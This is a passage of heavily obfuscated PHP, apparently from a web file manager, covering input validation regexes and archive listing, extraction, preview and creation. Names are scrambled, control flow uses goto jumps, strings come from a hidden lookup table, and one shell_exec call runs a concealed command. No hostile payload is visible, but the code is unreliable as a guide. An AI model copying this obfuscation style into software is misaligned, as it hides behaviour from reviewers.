(!is_null($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]])) { $C‘‚âÎ˜©„[$CóÄÄÂ‚ºÒ] = $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]]; } } else { if (isset($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1913]])) { $A¾ÀŸÎÑÜ[] = $Bí•Ğ¸†µ; } } continue; } if (isset($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1913]]) && $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1913]] == $DŞ­ÉÃÜåÙ[297]) { $d÷¨›ÑÇˆİ = json_decode($in[$eïÄ²ºˆ­], !0); if (is_array($d÷¨›ÑÇˆİ)) { $C‘‚âÎ˜©„[$CóÄÄÂ‚ºÒ] = $d÷¨›ÑÇˆİ; } else { if (array_key_exists($DŞ­ÉÃÜåÙ[1912], $A¬ç¹ÂäÂ)) { if (!is_null($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]])) { $C‘‚âÎ˜©„[$CóÄÄÂ‚ºÒ] = $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]]; } } else { $A¾ÀŸÎÑÜ[] = $Bí•Ğ¸†µ; } } continue; } $C´øÙÙ¯ê÷ = _get($A¬ç¹ÂäÂ, $DŞ­ÉÃÜåÙ[1039]); goto BÓñ‰ô‘É‹; BÓñ‰ô‘É‹: if (isset($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1913]]) && !self::check($in[$eïÄ²ºˆ­], $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1913]], $C´øÙÙ¯ê÷)) { if (array_key_exists($DŞ­ÉÃÜåÙ[1912], $A¬ç¹ÂäÂ)) { if (!is_null($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]])) { $C‘‚âÎ˜©„[$CóÄÄÂ‚ºÒ] = $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1912]]; } } else { $A¾ÀŸÎÑÜ[] = $Bí•Ğ¸†µ; } continue; } $C‘‚âÎ˜©„[$CóÄÄÂ‚ºÒ] = $in[$eïÄ²ºˆ­]; goto e¾îÍÒ§Ô¹; B’Æ¶«åŞ: $Bí•Ğ¸†µ = _get($A¬ç¹ÂäÂ, $DŞ­ÉÃÜåÙ[1272], $AÌÚ‘è¿á¡ . $DŞ­ÉÃÜåÙ[902] . $eïÄ²ºˆ­); $CóÄÄÂ‚ºÒ = $eïÄ²ºˆ­; if (isset($A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1911]]) && $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1911]]) { $CóÄÄÂ‚ºÒ = $A¬ç¹ÂäÂ[$DŞ­ÉÃÜåÙ[1911]]; } goto Dß‡ßí ¯é; e¾îÍÒ§Ô¹: } goto F²ºñ©ôĞ½; F²ºñ©ôĞ½: if (count($A¾ÀŸÎÑÜ) > 0) { show_json(implode($DŞ­ÉÃÜåÙ[1914], $A¾ÀŸÎÑÜ), !1); } return $C‘‚âÎ˜©„; goto dğâ­ÑåÚ; c‡Ú°÷˜°¿: $DŞ­ÉÃÜåÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; global $in; $C‘‚âÎ˜©„ = array(); goto Añ‡¹ñ†¤—; dğâ­ÑåÚ: } public static function reg($b‰¥šÙàä¢ = "\162\145\161\165\151\x72\145") { static $c÷ëšÊª×î = array("\x72\145\x71\165\x69\162\145" => "\56\x2b", "\x6e\165\155\x62\145\162" => "\x5c\x64\x2b", "\x69\x6e\x74\145\147\145\162" => "\134\x64\x2b", "\x68\145\x78" => "\x5b\60\55\71\x41\55\106\x61\55\146\135\x2b", "\151\156\164" => "\133\x2d\134\53\135\x3f\x5c\x64\x2b", "\x62\x6f\x6f\x6c" => "\60\x7c\61", "\146\x6c\x6f\x61\164" => "\133\55\134\53\x5d\x3f\x5c\144\x2b\x28\x5c\56\x5c\144\53\x29\77", "\145\x6e\147\154\151\x73\x68" => "\x5b\x41\x2d\132\x61\x2d\172\40\x5d\53", "\x63\150\151\156\x65\x73\x65" => "\133\x5c\x78\x7b\64\145\x30\x30\175\55\x5c\170\x7b\x39\x66\141\x35\175\135\x2b", "\x68\x61\x73\x43\x68\151\x6e\x65\x73\x65" => "\57\x28\133\x5c\170\173\x34\x65\x30\60\175\55\134\x78\173\x39\x66\x61\x35\175\135\x2b\x29\57\x75", "\x65\x6d\141\x69\154" => "\134\x77\x2b\x28\133\x5c\x2e\134\x2d\x5d\134\167\53\x29\52\134\100\x5c\x77\53\50\133\134\x2e\134\x2d\x5d\134\x77\53\x29\52\x5c\x2e\134\167\53", "\x70\150\x6f\156\x65" => "\x31\133\x33\55\71\135\134\144\x7b\x39\175", "\164\x65\154\x70\150\x6f\156\x65" => "\x28\x5c\x28\134\144\x7b\x33\x2c\64\x7d\134\x29\174\x5c\144\173\63\x2c\x34\x7d\x2d\x7c\134\x73\x29\77\x5c\x64\x7b\67\x2c\61\x34\175", "\x75\x72\154" => "\x28\x68\x74\164\x70\x7c\x66\164\x70\174\150\164\164\160\163\51\72\x5c\57\134\57\133\134\x77\x5c\x2d\137\x5d\53\50\134\56\133\x5c\167\134\55\137\x5d\53\x29\x2b\50\x5b\134\167\x5c\55\134\x2e\54\x40\x3f\136\x3d\x25\x26\x3a\134\x2f\176\x5c\x2b\43\135\52\x5b\134\x77\x5c\x2d\x5c\100\x3f\x5e\75\45\x26\x5c\57\176\x5c\x2b\43\x5d\x29\77", "\165\x72\154\x46\x75\154\x6c" => "\x5b\141\x2d\172\x41\x2d\x7a\x5d\53\72\x5c\57\134\x2f\x5b\x5e\x5c\x73\135\52", "\151\x70" => "\50\134\x64\x7b\61\54\x33\x7d\134\x2e\51\173\x33\x7d\50\x5c\x64\x7b\x31\54\x33\175\51", "\x7a\151\x70" => "\x5b\x31\x2d\x39\x5d\x5c\144\x7b\x35\175\50\77\x21\x5c\144\x29", "\x69\144\x43\141\162\x64" => "\50\x5c\x64\x7b\61\x35\x7d\x29\x7c\x28\x5c\x64\x7b\61\67\175\x28\134\144\x7c\130\174\x78\x29\51", "\143\157\x6c\157\x72" => "\x23\50\133\60\55\x39\x41\x2d\x46\141\x2d\146\135\173\63\x7d\174\133\x30\x2d\x39\101\x2d\106\141\x2d\x66\x5d\x7b\66\175\51", "\x74\151\155\x65" => "\50\x5b\x30\x2d\x31\x5d\134\144\x7c\x32\133\60\55\64\x5d\x29\x3a\133\x30\55\x35\135\134\144", "\x64\141\x74\x65" => "\x5c\x64\173\x34\x7d\133\55\x5c\57\135\77\50\x30\133\x31\x2d\x39\x5d\174\x31\133\x30\55\62\x5d\x29\x5b\55\x5c\57\x5d\x3f\50\133\x30\55\x32\x5d\x5c\144\174\63\133\60\x2d\61\135\x29", "\144\141\164\145\124\151\x6d\145" => "\x5c\x64\x7b\64\175\133\x2d\x5c\57\x5d\77\x28\60\x5b\61\55\x39\135\x7c\61\133\x30\55\62\x5d\51\x5b\55\134\x2f\x5d\77\50\x5b\x30\x2d\x32\135\134\144\x7c\63\133\60\x2d\x31\135\x29\134\x73\x2b\x28\133\60\x2d\61\135\134\x64\174\62\x5b\60\x2d\64\x5d\x29\72\x5b\60\x2d\65\135\x5c\144", "\160\141\x73\x73\x77\157\162\x64" => "\50\x3f\75\x2e\52\134\144\x29\50\77\x3d\x2e\x2a\133\x61\55\x7a\x5d\x29\50\77\75\x2e\52\x5b\101\x2d\x5a\x5d\x29\56\x7b\70\54\62\x30\x7d", "\153\x65\x79" => "\x5b\101\x2d\132\141\x2d\172\x30\55\x39\x5f\x5c\55\134\56\x5d\53", "\153\145\x79\x46\x75\154\154" => "\x5b\x41\x2d\x5a\141\x2d\172\60\55\x39\x5f\x5c\x2d\134\56\x5c\163\x2c\x5d\53"); if (!$b‰¥šÙàä¢) { return $c÷ëšÊª×î; } return $c÷ëšÊª×î[$b‰¥šÙàä¢]; } public static function check($DÓˆ‘ÑÓùß, $d¯¹ï¿Êì, $fßÉÖ‡²ÛÖ = null) { $CâŸ÷î£ë­ =& $_SERVER[åÌÛ»ô¢‚ö™]; switch ($d¯¹ï¿Êì) { case $CâŸ÷î£ë­[7]: return in_array($DÓˆ‘ÑÓùß, $fßÉÖ‡²ÛÖ); break; case $CâŸ÷î£ë­[1915]: return floatval($DÓˆ‘ÑÓùß) > $fßÉÖ‡²ÛÖ; break; case $CâŸ÷î£ë­[1916]: return floatval($DÓˆ‘ÑÓùß) < $fßÉÖ‡²ÛÖ; break; case $CâŸ÷î£ë­[340]: return strlen($DÓˆ‘ÑÓùß) >= $fßÉÖ‡²ÛÖ[0] && strlen($DÓˆ‘ÑÓùß) <= $fßÉÖ‡²ÛÖ[1]; break; case $CâŸ÷î£ë­[340]: if (is_array($fßÉÖ‡²ÛÖ)) { return strlen($DÓˆ‘ÑÓùß) >= $fßÉÖ‡²ÛÖ[0] && strlen($DÓˆ‘ÑÓùß) <= $fßÉÖ‡²ÛÖ[1]; break; } else { return strlen($DÓˆ‘ÑÓùß) == $fßÉÖ‡²ÛÖ; break; } case $CâŸ÷î£ë­[336]: return floatval($DÓˆ‘ÑÓùß) >= $fßÉÖ‡²ÛÖ[0] && floatval($DÓˆ‘ÑÓùß) <= $fßÉÖ‡²ÛÖ[1]; break; } $fŞĞ§ÃÎ§– = self::reg(!1); $d¯¹ï¿Êì = isset($fŞĞ§ÃÎ§–[$d¯¹ï¿Êì]) ? $fŞĞ§ÃÎ§–[$d¯¹ï¿Êì] : $d¯¹ï¿Êì; if (substr($d¯¹ï¿Êì, 0, 1) != $CâŸ÷î£ë­[8]) { $d¯¹ï¿Êì = $CâŸ÷î£ë­[1917] . $d¯¹ï¿Êì . $CâŸ÷î£ë­[1918]; } return preg_match($d¯¹ï¿Êì, $DÓˆ‘ÑÓùß) === 1; } public static function get($bõ¬·ë¶§í, $D–À‘äÑ”ƒ = null, $EåÉ£Ğ»á… = null, $c£¦‘´”ò = null) { goto cÄ»¬½æ; DËàôŠ†: return $eÃŒÈ‘„ëİ[$bõ¬·ë¶§í]; goto Få‹°Ä“íà; cÄ»¬½æ: $C—¸èøÑ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÅİâÇÍª = array(); if (!is_null($EåÉ£Ğ»á…)) { $eÅİâÇÍª[$C—¸èøÑ[34]] = $EåÉ£Ğ»á…; } goto DÏ—Ú­›¡÷; DÏ—Ú­›¡÷: if (!is_null($c£¦‘´”ò)) { $eÅİâÇÍª[$C—¸èøÑ[1039]] = $c£¦‘´”ò; } if (!is_null($D–À‘äÑ”ƒ)) { $eÅİâÇÍª[$C—¸èøÑ[1913]] = $D–À‘äÑ”ƒ; } $eÃŒÈ‘„ëİ = Input::getArray(array($bõ¬·ë¶§í => $eÅİâÇÍª)); goto DËàôŠ†; Få‹°Ä“íà: } } class KodArchive { static function init() { goto CÃ—‘§§³½; f£šÊëÍµø: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1925]; require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1926]; goto CÁ‡ËÑšĞ†; CÃ—‘§§³½: $D÷…Ÿ©ô–Ÿ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (defined($D÷…Ÿ©ô–Ÿ[1919])) { return; } define($D÷…Ÿ©ô–Ÿ[1919], SDK_DIR . $D÷…Ÿ©ô–Ÿ[1920]); goto F–¿²×–õÑ; F–¿²×–õÑ: define($D÷…Ÿ©ô–Ÿ[1921], TEMP_FILES); define($D÷…Ÿ©ô–Ÿ[1922], TEMP_FILES); define($D÷…Ÿ©ô–Ÿ[1923], $D÷…Ÿ©ô–Ÿ[1924]); goto f£šÊëÍµø; CÁ‡ËÑšĞ†: require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1927]; require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1928]; require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1929]; goto DÓÔ³êŸ‡©; DÓÔ³êŸ‡©: require_once ARCHIVE_LIB . $D÷…Ÿ©ô–Ÿ[1930]; goto d¨à™‡àâ•; d¨à™‡àâ•: } static function checkIfType($A®µ¶ª¡Õ, $AŠ‹¡İ³Ş) { goto dë—ëæâŞ; dë—ëæâŞ: $A…³ù›óí‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $E´–À³ºÜ¥ = array($A…³ù›óí‚[316] => array($A…³ù›óí‚[316], $A…³ù›óí‚[1931], $A…³ù›óí‚[1932], $A…³ù›óí‚[1933]), $A…³ù›óí‚[1934] => array($A…³ù›óí‚[1934], $A…³ù›óí‚[1935], $A…³ù›óí‚[1070], $A…³ù›óí‚[1068]), $A…³ù›óí‚[1071] => array($A…³ù›óí‚[1071], $A…³ù›óí‚[1936], $A…³ù›óí‚[1937], $A…³ù›óí‚[1938], $A…³ù›óí‚[1939], $A…³ù›óí‚[1940], $A…³ù›óí‚[1941])); goto C¤ÜìƒÉù; d±ö ”ƒÅÏ: return $Dñ÷É”³™Ù; goto cêÔëº™µ; C¤ÜìƒÉù: $Dñ÷É”³™Ù = in_array($A®µ¶ª¡Õ, $E´–À³ºÜ¥[$AŠ‹¡İ³Ş]); if ($Dñ÷É”³™Ù && ($AŠ‹¡İ³Ş == $A…³ù›óí‚[316] || $AŠ‹¡İ³Ş == $A…³ù›óí‚[1934]) && (!function_exists($A…³ù›óí‚[1942]) || !function_exists($A…³ù›óí‚[1943]))) { show_tips($A…³ù›óí‚[1944]); } if ($Dñ÷É”³™Ù && $AŠ‹¡İ³Ş == $A…³ù›óí‚[1071] && (!function_exists($A…³ù›óí‚[1945]) || !strstr(shell_exec($A…³ù›óí‚[1946]), $A…³ù›óí‚[1947]))) { show_tips($A…³ù›óí‚[1948]); } goto d±ö ”ƒÅÏ; cêÔëº™µ: } static function listContent($AğÃĞÇ„ù©, $A¶«¶ƒ¬Ü = true) { $fß›À†¥…’ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $e§ò÷¶¤¤… = !empty($GLOBALS[$fß›À†¥…’[1075]]) ? $GLOBALS[$fß›À†¥…’[1075]] : get_path_ext($AğÃĞÇ„ù©); $EêªŠ‡ÄÉ² = !1; if (self::checkIfType($e§ò÷¶¤¤…, $fß›À†¥…’[1934])) { $föµ¹Ùœ¹Ú = PclTarList($AğÃĞÇ„ù©, $e§ò÷¶¤¤…); $EêªŠ‡ÄÉ² = array(); for ($eÚ‘¤ìƒ­å = 0; $eÚ‘¤ìƒ­å < count($föµ¹Ùœ¹Ú); $eÚ‘¤ìƒ­å++) { $C”óÍªêĞ = $föµ¹Ùœ¹Ú[$eÚ‘¤ìƒ­å]; if ($C”óÍªêĞ[$fß›À†¥…’[1949]] == $fß›À†¥…’[1950] || $C”óÍªêĞ[$fß›À†¥…’[1949]] == $fß›À†¥…’[1951]) { continue; } if ($A¶«¶ƒ¬Ü) { $C”óÍªêĞ[$fß›À†¥…’[1952]] = ltrim($C”óÍªêĞ[$fß›À†¥…’[1952]], $fß›À†¥…’[1181]); } if ($C”óÍªêĞ[$fß›À†¥…’[1949]] == $fß›À†¥…’[1953]) { $C”óÍªêĞ[$fß›À†¥…’[76]] = !0; } else { $C”óÍªêĞ[$fß›À†¥…’[76]] = !1; } $C”óÍªêĞ[$fß›À†¥…’[1063]] = $eÚ‘¤ìƒ­å; $EêªŠ‡ÄÉ²[] = $C”óÍªêĞ; } } else { if (self::checkIfType($e§ò÷¶¤¤…, $fß›À†¥…’[1071])) { $c°÷¦Ê–‚ğ = kodRarArchive::listContent($AğÃĞÇ„ù©); if (!$c°÷¦Ê–‚ğ[$fß›À†¥…’[1059]]) { return $c°÷¦Ê–‚ğ; } else { $EêªŠ‡ÄÉ² = $c°÷¦Ê–‚ğ[$fß›À†¥…’[1061]]; } } else { if (kodZipArchive::support($fß›À†¥…’[370])) { $EêªŠ‡ÄÉ² = kodZipArchive::listContent($AğÃĞÇ„ù©); } else { $F¬¬ö“§Ù = new PclZip($AğÃĞÇ„ù©); $EêªŠ‡ÄÉ² = $F¬¬ö“§Ù->listContent(); } } } if ($EêªŠ‡ÄÉ²) { $Fóñ†õ¶­ = unzip_charset_get($EêªŠ‡ÄÉ²); $A¶«¶ƒ¬Ü = $A¶«¶ƒ¬Ü && function_exists($fß›À†¥…’[65]); for ($eÚ‘¤ìƒ­å = 0; $eÚ‘¤ìƒ­å < count($EêªŠ‡ÄÉ²); $eÚ‘¤ìƒ­å++) { $EêªŠ‡ÄÉ²[$eÚ‘¤ìƒ­å][$fß›À†¥…’[1952]] = str_replace(array($fß›À†¥…’[1098], $fß›À†¥…’[1954]), $fß›À†¥…’[790], $EêªŠ‡ÄÉ²[$eÚ‘¤ìƒ­å][$fß›À†¥…’[1952]]); if ($A¶«¶ƒ¬Ü) { $EêªŠ‡ÄÉ²[$eÚ‘¤ìƒ­å][$fß›À†¥…’[1952]] = iconv_to($EêªŠ‡ÄÉ²[$eÚ‘¤ìƒ­å][$fß›À†¥…’[1952]], $Fóñ†õ¶­, $fß›À†¥…’[341]); unset($EêªŠ‡ÄÉ²[$eÚ‘¤ìƒ­å][$fß›À†¥…’[1955]]); } } return array($fß›À†¥…’[1059] => !0, $fß›À†¥…’[1061] => $EêªŠ‡ÄÉ²); } else { return array($fß›À†¥…’[1059] => !1, $fß›À†¥…’[1061] => $EêªŠ‡ÄÉ²); } } static function extract($cñ¯‘ˆÖŠÒ, $E¢Ëâ‹ª“„, $AÉÎ¸ÈƒÖÚ = "\x2d\x31", &$CòÎë×‡ˆ› = false) { goto a¬ƒõî‰åÅ; a¬ƒõî‰åÅ: $fÇ…ß–ƒìï =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $aÒø’Ğ²É‹ = !empty($GLOBALS[$fÇ…ß–ƒìï[1075]]) ? $GLOBALS[$fÇ…ß–ƒìï[1075]] : get_path_ext($cñ¯‘ˆÖŠÒ); goto BíÊÂ™œœ˜; fïŠ»ë”: if (self::checkIfType($aÒø’Ğ²É‹, $fÇ…ß–ƒìï[1934])) { if ($AÉÎ¸ÈƒÖÚ != $fÇ…ß–ƒìï[1058]) { $e±Çİ©ÎÒ = unzip_pre_name($e±Çİ©ÎÒ); $A¥•Ú¯“’ë = unzip_pre_name($A¥•Ú¯“’ë); $D‡šë¡’·» = PclTarExtractList($cñ¯‘ˆÖŠÒ, array($e±Çİ©ÎÒ), $E¢Ëâ‹ª“„, $A¥•Ú¯“’ë, $aÒø’Ğ²É‹); } else { $D‡šë¡’·» = PclTarExtract($cñ¯‘ˆÖŠÒ, $E¢Ëâ‹ª“„, $fÇ…ß–ƒìï[377], $aÒø’Ğ²É‹); } return array($fÇ…ß–ƒìï[1059] => $D‡šë¡’·», $fÇ…ß–ƒìï[1061] => PclErrorString(!0)); } else { if (self::checkIfType($aÒø’Ğ²É‹, $fÇ…ß–ƒìï[1071])) { return kodRarArchive::extract($cñ¯‘ˆÖŠÒ, $E¢Ëâ‹ª“„, $aÒø’Ğ²É‹, $CòÎë×‡ˆ›); } else { if (kodZipArchive::support($fÇ…ß–ƒìï[1956])) { return kodZipArchive::extract($cñ¯‘ˆÖŠÒ, $E¢Ëâ‹ª“„, $CòÎë×‡ˆ›); } else { $a¤äÛ¢é = new PclZip($cñ¯‘ˆÖŠÒ); if ($AÉÎ¸ÈƒÖÚ != $fÇ…ß–ƒìï[1058]) { $D‡šë¡’·» = $a¤äÛ¢é->extract(PCLZIP_OPT_PATH, $E¢Ëâ‹ª“„, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fÇ…ß–ƒìï[1957], PCLZIP_OPT_BY_NAME, $cÈ—êó©ïÂ[$fÇ…ß–ƒìï[1952]], PCLZIP_OPT_REMOVE_PATH, $A¥•Ú¯“’ë, PCLZIP_OPT_REPLACE_NEWER); } else { $D‡šë¡’·» = $a¤äÛ¢é->extract(PCLZIP_OPT_PATH, $E¢Ëâ‹ª“„, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fÇ…ß–ƒìï[1957], PCLZIP_OPT_REPLACE_NEWER); } return array($fÇ…ß–ƒìï[1059] => $D‡šë¡’·», $fÇ…ß–ƒìï[1061] => $a¤äÛ¢é->errorName(!0)); } } } return array($fÇ…ß–ƒìï[1059] => !1, $fÇ…ß–ƒìï[1061] => $fÇ…ß–ƒìï[1958]); goto aƒŸ·½×ÍÔ; BíÊÂ™œœ˜: $d«°Ê‰Š˜ = self::listContent($cñ¯‘ˆÖŠÒ, !1); if (!$d«°Ê‰Š˜[$fÇ…ß–ƒìï[1059]]) { return $d«°Ê‰Š˜; } if ($AÉÎ¸ÈƒÖÚ != $fÇ…ß–ƒìï[1058]) { goto BÉã×ÉéŒ˜; Aî…Å˜“: if ($GLOBALS[$fÇ…ß–ƒìï[6]][$fÇ…ß–ƒìï[1179]] != $fÇ…ß–ƒìï[341]) { $e±Çİ©ÎÒ = unzip_pre_name($CòÎë×‡ˆ›); } $A¥•Ú¯“’ë = get_path_father($CòÎë×‡ˆ›); if ($A¥•Ú¯“’ë == $CòÎë×‡ˆ›) { $A¥•Ú¯“’ë = $fÇ…ß–ƒìï[33]; } goto FšÜÌõ£„; BÉã×ÉéŒ˜: $cÈ—êó©ïÂ = self::fileIndex($d«°Ê‰Š˜[$fÇ…ß–ƒìï[1061]], $AÉÎ¸ÈƒÖÚ); $CòÎë×‡ˆ› = str_replace(array($fÇ…ß–ƒìï[1098], $fÇ…ß–ƒìï[1954]), $fÇ…ß–ƒìï[70], $cÈ—êó©ïÂ[$fÇ…ß–ƒìï[1952]]); $e±Çİ©ÎÒ = $CòÎë×‡ˆ›; goto Aî…Å˜“; FšÜÌõ£„: if ($cÈ—êó©ïÂ[$fÇ…ß–ƒìï[76]]) { $e±Çİ©ÎÒ = rtrim($e±Çİ©ÎÒ, $fÇ…ß–ƒìï[8]) . $fÇ…ß–ƒìï[8]; $CòÎë×‡ˆ› = array($CòÎë×‡ˆ›); } $C°ÓÉ‰©é² = str_replace($fÇ…ß–ƒìï[93], $fÇ…ß–ƒìï[8], $e±Çİ©ÎÒ); if (substr($C°ÓÉ‰©é², -1) == $fÇ…ß–ƒìï[8]) { if (!strstr(trim($C°ÓÉ‰©é², $fÇ…ß–ƒìï[8]), $fÇ…ß–ƒìï[8])) { $E¢Ëâ‹ª“„ = $E¢Ëâ‹ª“„ . get_path_this($C°ÓÉ‰©é²) . $fÇ…ß–ƒìï[8]; } } else { if ($A¥•Ú¯“’ë == $e±Çİ©ÎÒ) { $A¥•Ú¯“’ë = $fÇ…ß–ƒìï[33]; } } goto EŸĞ•éƒ»; EŸĞ•éƒ»: } goto fïŠ»ë”; aƒŸ·½×ÍÔ: } static function fileIndex($bí¿ğ²ìØ•, $f—¹ øœ–, $b¶¶“Š¢Ö = false) { goto CùÙ‰İíÚ; AŒ½¢–éèº: $eœª®±˜ÄĞ = $a•®ãŠÉÓ¸; if ($b¶¶“Š¢Ö) { $eœª®±˜ÄĞ = $a•®ãŠÉÓ¸[$b¶¶“Š¢Ö]; if ($a•®ãŠÉÓ¸[$aåÛ©›ì˜à[76]]) { $eœª®±˜ÄĞ = rtrim($eœª®±˜ÄĞ, $aåÛ©›ì˜à[8]) . $aåÛ©›ì˜à[8]; } } return $eœª®±˜ÄĞ; goto EÇƒê†Ğ†Ã; CùÙ‰İíÚ: $aåÛ©›ì˜à =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); if (!is_array($bí¿ğ²ìØ•)) { return !1; } goto C¾Ù‹²åÒ; C¾Ù‹²åÒ: $CÉöä¾¦§„ = count($bí¿ğ²ìØ•); for ($EİÂÓÙ³‰ñ = 0; $EİÂÓÙ³‰ñ < $CÉöä¾¦§„; $EİÂÓÙ³‰ñ++) { if ($f—¹ øœ– == $bí¿ğ²ìØ•[$EİÂÓÙ³‰ñ][$aåÛ©›ì˜à[1063]]) { $a•®ãŠÉÓ¸ = $bí¿ğ²ìØ•[$EİÂÓÙ³‰ñ]; break; } } if (!$a•®ãŠÉÓ¸) { show_tips($aåÛ©›ì˜à[1959]); } goto AŒ½¢–éèº; EÇƒê†Ğ†Ã: } static function extractZipFile($a…›‘Ëğ‰ï, $Aìµ½±ëº, $C›ŠËß©½À = false) { goto Bø‡ØƒÀˆ”; Bø‡ØƒÀˆ”: $eÕ£¨ ì­¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $E”·ŠÊÜ‘¯ = TEMP_FILES . hash_path($a…›‘Ëğ‰ï) . $eÕ£¨ ì­¹[8]; goto aÌ¯Í…²˜; aÌ¯Í…²˜: mk_dir($E”·ŠÊÜ‘¯); $aì¹®İ—¢ = $E”·ŠÊÜ‘¯ . md5($a…›‘Ëğ‰ï . $Aìµ½±ëº); if ($C›ŠËß©½À) { $aì¹®İ—¢ = $E”·ŠÊÜ‘¯ . $C›ŠËß©½À; } goto E‘İÓÛƒ“³; f§Ş æƒñ: if (!file_exists($A¨×ê÷èµè)) { return !1; } @rename($A¨×ê÷èµè, $aì¹®İ—¢); return $aì¹®İ—¢; goto fÎß«Éùæ; E‘İÓÛƒ“³: if (file_exists($aì¹®İ—¢)) { return $aì¹®İ—¢; } $EˆÖõ¥”Ù“ = new PclZip($a…›‘Ëğ‰ï); $A¨×ê÷èµè = unzip_filter_ext($E”·ŠÊÜ‘¯ . get_path_this($Aìµ½±ëº)); goto f…‚á™Ë˜‹; f…‚á™Ë˜‹: $DË·á…ë† = get_path_father($Aìµ½±ëº); if ($DË·á…ë† == $Aìµ½±ëº) { $DË·á…ë† = $eÕ£¨ ì­¹[33]; } $b—ŒÅ°…ŸÀ = $EˆÖõ¥”Ù“->extract(PCLZIP_OPT_PATH, $E”·ŠÊÜ‘¯, PCLZIP_CB_PRE_FILE_NAME, $eÕ£¨ ì­¹[1957], PCLZIP_OPT_REMOVE_PATH, $DË·á…ë†, PCLZIP_OPT_BY_NAME, $Aìµ½±ëº); goto f§Ş æƒñ; fÎß«Éùæ: } static function filePreview($dÆã„ùäÛÄ, $f†åŒŸİ•á, $D¢À‘ÙÌ× = false, $D…ñæÊÁ¯Ë = false) { goto f¥ĞÃáõË; A—ƒ›Æéƒİ: if (!$b‘™ê½Ş[$eğâŠ‡§Ç¦[1059]]) { show_json($b‘™ê½Ş[$eğâŠ‡§Ç¦[1061]], !1); } if (!file_exists($Aª™°Ø‘¯µ)) { show_json($eğâŠ‡§Ç¦[1961], !1); } @rename($Aª™°Ø‘¯µ, $Aºœã×ª); goto EîÜ¯µÙñ³; c²„¤ôÁÉ¤: $b‘™ê½Ş = self::extract($dÆã„ùäÛÄ, $e“Œ¶ùÔÄ, $f†åŒŸİ•á, $BÅÕª¤¡£‡); if (is_array($BÅÕª¤¡£‡)) { show_json($eğâŠ‡§Ç¦[1960], !1); } if (file_exists($Aºœã×ª)) { IO::fileOut($Aºœã×ª, $D¢À‘ÙÌ×, get_path_this($BÅÕª¤¡£‡)); return; } goto e×«º¸„«°; c¸–Ÿ¦¯İ«: mk_dir($e“Œ¶ùÔÄ); $Aºœã×ª = $e“Œ¶ùÔÄ . md5($dÆã„ùäÛÄ . $f†åŒŸİ•á . $D…ñæÊÁ¯Ë); $BÅÕª¤¡£‡ = $eğâŠ‡§Ç¦[33]; goto c²„¤ôÁÉ¤; e×«º¸„«°: $BÅÕª¤¡£‡ = unzip_pre_name($BÅÕª¤¡£‡); $Fù°ªêùˆÂ = get_path_this($BÅÕª¤¡£‡); $Aª™°Ø‘¯µ = unzip_filter_ext($e“Œ¶ùÔÄ . $Fù°ªêùˆÂ); goto A—ƒ›Æéƒİ; EîÜ¯µÙñ³: if (!file_exists($Aºœã×ª)) { del_dir($e“Œ¶ùÔÄ); show_json($eğâŠ‡§Ç¦[1962]); } IO::fileOut($Aºœã×ª, $D¢À‘ÙÌ×, $Fù°ªêùˆÂ); goto AÙò œÔî•; f¥ĞÃáõË: $eğâŠ‡§Ç¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $e“Œ¶ùÔÄ = TEMP_FILES . hash_path($dÆã„ùäÛÄ) . $eğâŠ‡§Ç¦[8]; goto c¸–Ÿ¦¯İ«; AÙò œÔî•: } static function create($f¿ò¶µÎ’‹, $DÛ½Ÿ ¼¬·) { $BÆ°¼ÈĞ‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::init(); $cƒáš¬Æ¯Ë = get_path_ext($f¿ò¶µÎ’‹); $A²é°·ŠØ½ = !1; if (self::checkIfType($cƒáš¬Æ¯Ë, $BÆ°¼ÈĞ‡[316])) { if (kodZipArchive::support($BÆ°¼ÈĞ‡[1034])) { return kodZipArchive::create($f¿ò¶µÎ’‹, $DÛ½Ÿ ¼¬·); } $F³ö´ÜŠ = new PclZip($f¿ò¶µÎ’‹); foreach ($DÛ½Ÿ ¼¬· as $fÁœ˜–¼ => $Aâ™…Û›Ğ„) { $Aâ™…Û›Ğ„ = str_replace($BÆ°¼ÈĞ‡[493], $BÆ°¼ÈĞ‡[8], $Aâ™…Û›Ğ„); $aÎÉ†„†‚¢ = Kodio::clear(get_path_father($Aâ™…Û›Ğ„)); if ($fÁœ˜–¼ == 0) { $A²é°·ŠØ½ = $F³ö´ÜŠ->create($Aâ™…Û›Ğ„, PCLZIP_OPT_REMOVE_PATH, $aÎÉ†„†‚¢, PCLZIP_CB_PRE_FILE_NAME, $BÆ°¼ÈĞ‡[1963]); continue; } $A²é°·ŠØ½ = $F³ö´ÜŠ->add($Aâ™…Û›Ğ„, PCLZIP_OPT_REMOVE_PATH, 